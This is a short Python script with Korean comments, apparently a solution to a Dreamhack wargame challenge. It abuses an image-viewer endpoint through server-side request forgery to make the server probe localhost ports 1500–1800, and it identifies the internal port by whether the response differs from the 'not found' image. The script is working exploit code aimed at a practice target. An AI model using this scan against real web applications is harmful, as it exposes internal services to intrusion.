import requests
from tqdm import tqdm
#반복문이 얼마나 진행되었는지 표시해주는 라이브러리

img_notfound = "iVBORw0KG" #png 파일의 고유한 지문, 접속 불가한 포르를 걸러내기 위함
port = 10766
url = f"http://host3.dreamhack.games:{port}/img_viewer"

def send_img(img_url):
    global url
    data = {
        "url":img_url,
        }
    try :
        response = requests.post(url,data=data, timeout=1.0)
        return response.text
    except Exception:
        return img_notfound

def find_port():
    for rst_port in tqdm(range(1500,1801)):
        img_url = f"http://Localhost:{rst_port}"
        if img_notfound not in send_img(img_url):
            print(f"\n[+]Port num : {rst_port}")
            return rst_port
    return None

internal_port = find_port()
